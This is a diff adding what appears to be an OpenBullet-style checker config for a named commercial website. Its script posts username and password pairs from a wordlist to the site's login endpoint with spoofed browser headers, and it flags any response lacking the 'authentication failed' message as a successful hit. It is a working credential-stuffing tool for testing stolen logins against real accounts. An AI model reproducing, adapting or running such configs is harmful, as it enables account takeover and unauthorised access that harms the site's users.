@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "\\Reallifecam.ini",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-19T23:15:39.2197011+00:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#post REQUEST POST "https://www.reallifecam.com/resources/login" AutoRedirect=TRUE 
+  CONTENT "login=<USER>&password=<PASS>" 
+  CONTENTTYPE "multipart/form-data; boundary=----WebKitFormBoundary3JCIY68BXxMMBR4H" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.reallifecam.com/en/view/13_1" 
+  HEADER "origin: https://www.reallifecam.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "{\"message\": \"authentication failed\", \"error\": \"auth-failed\"}" 
+  KEYCHAIN Failure OR 
+    KEY "{\"message\": \"authentication failed\", \"error\": \"auth-failed\"}" 
